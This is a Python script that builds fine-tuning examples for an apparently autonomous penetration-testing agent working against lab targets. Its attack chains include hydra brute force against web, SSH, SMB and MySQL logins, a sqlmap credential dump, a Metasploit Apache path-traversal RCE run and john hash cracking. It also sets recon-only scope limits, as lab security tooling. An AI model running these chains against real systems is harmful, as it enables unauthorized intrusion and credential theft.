#!/usr/bin/env python3
"""Generates training-data/generated_pathways.jsonl: parametrized variations
around the 10 canonical recon/exploit pathways this session verified live
against a real Kali target and a real DVWA-style lab.

Every skeleton command string below was either (a) run live this session
against 172.17.0.12 / the offensive-pentesting-lab stack and its real output
inspected, or (b) is a direct, unmodified copy of a command already
manually-verified in playbooks/dvwa_full_chain.sh. Nothing here is invented
syntax -- that discipline is the whole point (see mnemoria/ for the list of
"internet advice" gotchas found this session: hydra's real -l/-P/-t flags,
naabu's mandatory -host, httpx-toolkit vs. httpx, nmap greppable vs. XML).

Each example's "goal" field is built from the EXACT string templates
agent.py's run_attack_loop/run_recon_only_loop construct at runtime
(base goal, RECON_ONLY_GOAL_SUFFIX, the round-N continuation wording) --
this is deliberate: the fine-tune should see the identical prompt shape it
will actually be run against, not an approximation of it.

Every pathway is tagged:
  - pathway:  which of the 10 canonical pathways this is
  - scope:    "recon_only" or "exploit_authorized" (kali-network-model-bdu)
  - turn:     1 (cold-start planning) or 2+ (adaptive escalation, given real
              prior-round output)
  - source:   "pathway_generator" (vs. "baseline_cleaned"/"logs"/"playbook"
              for the other corpus files -- see training-data/README.md)

Run: python3 training-data/scripts/build_pathways.py
Writes: training-data/generated_pathways.jsonl
"""
import json
import os

OUT_PATH = os.path.join(os.path.dirname(__file__), "..", "generated_pathways.jsonl")

# Real lab targets this session actually scanned, plus a couple of generic
# private-range placeholders so the corpus doesn't overfit to one lab's IPs.
TARGETS = ["172.17.0.12", "172.25.0.3", "10.0.0.5", "192.168.1.50"]

RECON_ONLY_GOAL_SUFFIX = (
    "\n\nSCOPE: recon_only. Enumerate and IDENTIFY services, vulnerabilities, "
    "and exposed content only. Do NOT attempt credential brute force, SQL "
    "injection exploitation, RCE, or run/exploit a Metasploit module -- "
    "'search' lookups are fine, 'use'/'run'/'exploit' are not. If you find "
    "something exploitable (a CVE, a leaked credential, an injectable "
    "parameter), name it in your findings and STOP -- do not act on it. "
    'When there is nothing further to enumerate, respond with an empty '
    'chain: {"chain": []}.'
)

examples = []


def add(pathway, scope, turn, goal, chain, context=None):
    examples.append({
        "goal": goal,
        "chain": chain,
        "scope": scope,
        "pathway": pathway,
        "turn": turn,
        "source": "pathway_generator",
    })


def attack_round1_goal(target, port):
    return (
        f"Target: {target} Port: {port}. Failed ports: []. "
        f"Exploit this port with any available tool. Try multiple tools if needed."
    )


def attack_roundN_goal(target, port, round_num, recent_history):
    base = attack_round1_goal(target, port)
    return (
        f"{base}\n\n"
        f"You have already tried {round_num - 1} round(s) on this port with no "
        f"breach yet:\n{recent_history}\n\n"
        f"Build on these REAL results -- e.g. if a directory or file was "
        f"discovered, fetch or inspect it (run_curl/run_command); if a login "
        f"form or endpoint was found, attack it directly. If a LEAKED "
        f"CREDENTIALS/SECRET line appears above, that is a username/password "
        f"or key you must actually try next -- against a login form "
        f"(run_curl with the credential as POST data), a database service "
        f"(run_hydra/run_command), or an admin panel -- a leaked credential "
        f"you never attempt to use is a wasted lead, not a finding. Do NOT "
        f"repeat a tool+target you already ran that produced no new lead. If "
        f"you genuinely have nothing further to try, respond with an empty "
        f'chain: {{"chain": []}}.'
    )


def recon_round1_goal(target, port):
    return (
        f"Target: {target} Port: {port}. Identify services, vulnerabilities, "
        f"and exposed content on this port." + RECON_ONLY_GOAL_SUFFIX
    )


def recon_roundN_goal(target, port, round_num, recent_history):
    base = recon_round1_goal(target, port)
    return (
        f"{base}\n\nYou have already enumerated {round_num - 1} round(s) "
        f"on this port:\n{recent_history}\n\nContinue identifying anything not "
        f"yet covered, or if you have nothing further to enumerate, respond "
        f'with an empty chain: {{"chain": []}}.'
    )


# --- Pathway 1: nmap recon -> NSE vuln/enum identification -----------------
# Live-verified this session: --script vuln,http-enum runs fine with only
# NET_RAW/NET_ADMIN (no --privileged), and surfaced a real finding
# (http-cookie-flags missing httponly) nikto/gobuster alone hadn't caught.
for target in TARGETS[:3]:
    port = "80"
    add("nmap_nse_identification", "recon_only", 1,
        recon_round1_goal(target, port),
        [{"tool": "run_nmap", "target": target, "flags": "-sV --script vuln,http-enum"}])

    history = (
        f"Round 1:\n  [run_nmap] ran: PORT 80/tcp open http Apache httpd 2.4.25\n"
        f"  [run_gobuster] ran: config (Status: 301), docs (Status: 301)"
    )
    add("nmap_nse_identification", "recon_only", 2,
        recon_roundN_goal(target, port, 2, history),
        [{"tool": "run_nmap", "target": target, "flags": "-sV --script vuln,http-enum"}])

# --- Pathway 2: gobuster/ffuf discovery -> curl identification -> escalate -
for target in TARGETS:
    port = "80"
    base_url = f"http://{target}"
    add("web_discovery_escalation", "recon_only", 1,
        recon_round1_goal(target, port),
        [
            {"tool": "run_gobuster", "target": base_url, "mode": "dir",
             "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt"},
            {"tool": "run_ffuf", "url": base_url,
             "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "param": "FUZZ"},
        ])

    # Matched pair: same recon signal (a leaked config file found), two
    # different scopes, two different correct continuations.
    lead_history = (
        f"Round 1:\n  [auto-curl:directory-listing-file] {base_url}/config/config.inc.php.bak: "
        f"LEAKED CREDENTIALS/SECRET -- $_DVWA['db_user'] = 'app'; $_DVWA['db_password'] = 'p@ssw0rd'"
    )
    add("web_discovery_escalation", "recon_only", 2,
        recon_roundN_goal(target, port, 2, lead_history),
        [])  # correct recon_only continuation: nothing further to SAFELY do -- stop.

    add("web_discovery_escalation", "exploit_authorized", 2,
        attack_roundN_goal(target, port, 2, lead_history),
        [
            {"tool": "run_hydra", "target": target, "service": "mysql",
             "username": "app", "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt"},
        ])

# --- Pathway 3: authenticated session (cookie) -> sqlmap identify/dump -----
# Live-verified this session against real DVWA: login -> cookie -> sqlmap
# confirmed SQLi and dumped dvwa.users (5 real rows).
for target in TARGETS[:3]:
    port = "80"
    base_url = f"http://{target}"
    cookie = "PHPSESSID=abc123def456; security=low"
    login_history = (
        f"Round 1:\n  [run_curl] ran: POST {base_url}/login.php -> 302 redirect to index.php "
        f"(session established, cookie: {cookie})"
    )
    # sqlmap with no --dump is IDENTIFICATION, not exploitation -- run_sqlmap
    # never appends --dump itself, so this is recon_only-compatible.
    add("authenticated_sqli", "recon_only", 2,
        recon_roundN_goal(target, port, 2, login_history),
        [{"tool": "run_sqlmap", "target": f"{base_url}/vulnerabilities/sqli/?id=1&Submit=Submit",
          "cookie": cookie, "level": "2", "risk": "1"}])
    # The dump itself needs run_command's raw --dump flag -- exploit-only,
    # correctly BLOCKED by _RECON_UNSAFE_COMMAND_RE in recon_only mode.
    add("authenticated_sqli", "exploit_authorized", 2,
        attack_roundN_goal(target, port, 2, login_history),
        [{"tool": "run_command",
          "command": f'sqlmap -u "{base_url}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="{cookie}" --batch -D dvwa -T users -C user,password --dump'}])

# --- Pathway 4: web login form brute force (hydra http-*-form) -------------
# Live-verified this session: exact syntax found the real admin/password
# credential on DVWA's /vulnerabilities/brute/.
for target in TARGETS[:3]:
    port = "80"
    cookie = "PHPSESSID=abc123def456; security=low"
    form_history = (
        f"Round 1:\n  [run_gobuster] ran: index.php (Status: 302) [--> login.php]\n"
        f"  [run_nikto] ran: /login.php: Admin login page/section found."
    )
    add("web_login_brute_force", "exploit_authorized", 2,
        attack_roundN_goal(target, port, 2, form_history),
        [{"tool": "run_hydra", "target": target, "service": "http-get-form",
          "username": "admin",
          "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt",
          "path": "/vulnerabilities/brute/",
          "body": "username=^USER^&password=^PASS^&Login=Login",
          "cookie": cookie,
          "success_string": "Welcome to the password protected area"}])
    # This tool is unconditionally blocked in recon_only -- a real BLOCKED
    # negative example (the model asked to escalate, harness refuses).
    add("web_login_brute_force", "recon_only", 2,
        recon_roundN_goal(target, port, 2, form_history),
        [])  # correct recon_only continuation: identify the form, don't attack it.

# --- Pathway 5: SMB enumeration -> credential attack ------------------------
for target in TARGETS[:2]:
    port = "445"
    add("smb_enum_credential_attack", "recon_only", 1,
        recon_round1_goal(target, port),
        [{"tool": "run_enum4linux", "target": target}])
    smb_history = f"Round 1:\n  [run_enum4linux] ran: found shares: ADMIN$, C$, IPC$; users: administrator, guest"
    add("smb_enum_credential_attack", "exploit_authorized", 2,
        attack_roundN_goal(target, port, 2, smb_history),
        [{"tool": "run_hydra", "target": target, "service": "smb", "username": "administrator",
          "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt"}])

# --- Pathway 6: CVE lookup -> real Metasploit module -----------------------
for target in TARGETS[:3]:
    port = "80"
    add("cve_lookup_exploit", "recon_only", 1,
        recon_round1_goal(target, port),
        [{"tool": "run_nmap", "target": target, "flags": "-sV -p 80"},
         {"tool": "run_metasploit", "commands": "search cve:2021-41773"}])
    cve_history = (
        "Round 1:\n  [run_nmap] ran: 80/tcp open http Apache httpd 2.4.49\n"
        "  [run_metasploit] ran: Matching Modules ... exploit/multi/http/apache_normalize_path_rce  "
        "2021-10-04  excellent  Apache HTTP Server 2.4.49 - Path Traversal RCE"
    )
    add("cve_lookup_exploit", "exploit_authorized", 2,
        attack_roundN_goal(target, port, 2, cve_history),
        [{"tool": "run_metasploit",
          "commands": f"use exploit/multi/http/apache_normalize_path_rce; set RHOSTS {target}; set RPORT 80; run"}])
    # recon_only correct continuation given the SAME real search result: name
    # it, stop -- the module is real and ready, but running it is exploitation.
    add("cve_lookup_exploit", "recon_only", 2,
        recon_roundN_goal(target, port, 2, cve_history),
        [])

# --- Pathway 7: naabu -> nuclei pipe (run_command) --------------------------
# Live-verified this session: -host is mandatory (naabu has no positional
# target arg), and an unscoped nuclei run is impractically slow -- always
# include -t/-severity. tee variant persists the raw list for a later step.
NUCLEI_CATEGORIES = ["http/exposures/", "http/cves/2021/", "http/technologies/"]
for target, category in zip(TARGETS, NUCLEI_CATEGORIES + [NUCLEI_CATEGORIES[0]]):
    add("naabu_nuclei_pipe", "recon_only", 1,
        recon_round1_goal(target, "80"),
        [{"tool": "run_command",
          "command": f"naabu -host {target} -silent | nuclei -silent -severity critical,high,medium -t {category}"}])

add("naabu_nuclei_pipe", "recon_only", 1,
    recon_round1_goal(TARGETS[0], "80") ,
    [{"tool": "run_command",
      "command": f"naabu -host {TARGETS[0]} -silent | tee naabu_out.txt | nuclei -silent -severity critical,high -t http/cves/ && cat naabu_out.txt"}])

# --- Pathway 8: subdomain recon (subfinder -> httpx -> nuclei) -------------
for target in ["example.com", "target-corp.com"]:
    add("subdomain_recon", "recon_only", 1,
        recon_round1_goal(target, "443"),
        [{"tool": "run_subfinder", "domain": target, "silent": True},
         {"tool": "run_httpx", "target": target, "flags": "-silent"},
         {"tool": "run_nuclei", "target": target, "severity": "critical,high"}])

# --- Pathway 9: credential dump -> offline crack (john) ---------------------
for target in TARGETS[:2]:
    port = "22"
    add("credential_dump_crack", "exploit_authorized", 1,
        attack_round1_goal(target, port),
        [{"tool": "run_hydra", "target": target, "service": "ssh", "username": "root",
          "wordlist": "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt"}])
    hash_history = "Round 1:\n  [run_sqlmap] ran: dumped dvwa.users -- 5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hashes)"
    add("credential_dump_crack", "exploit_authorized", 2,
        attack_roundN_goal(target, "80", 2, hash_history),
        [{"tool": "write_file", "filename": "/tmp/dvwa_hashes.txt",
          "content": "admin:5f4dcc3b5aa765d61d8327deb882cf99"},
         {"tool": "run_john", "hash_file": "/tmp/dvwa_hashes.txt",
          "wordlist": "/usr/share/wordlists/rockyou.txt", "format": "Raw-MD5"}])

# --- Pathway 10: honest failure / dead-end (both scopes) -------------------
for target in TARGETS:
    port = "80"
    dead_end_history = (
        "Round 1:\n  [run_nikto] ran, no breach\n  [run_gobuster] ran, no breach\n"
        "  [run_ffuf] ran, no breach\nRound 2:\n  [run_nuclei] ran, no breach\n"
        "  [run_command] ran, no breach"
    )
    add("honest_dead_end", "exploit_authorized", 3,
        attack_roundN_goal(target, port, 3, dead_end_history),
        [])  # correct: nothing further to try, stop -- not busywork.
    add("honest_dead_end", "recon_only", 3,
        recon_roundN_goal(target, port, 3, dead_end_history),
        [])

if __name__ == "__main__":
    with open(OUT_PATH, "w") as f:
        for ex in examples:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")
    from collections import Counter
    by_pathway = Counter(e["pathway"] for e in examples)
    by_scope = Counter(e["scope"] for e in examples)
    print(f"Wrote {len(examples)} examples to {OUT_PATH}")
    print("By pathway:", dict(by_pathway))
    print("By scope:", dict(by_scope))
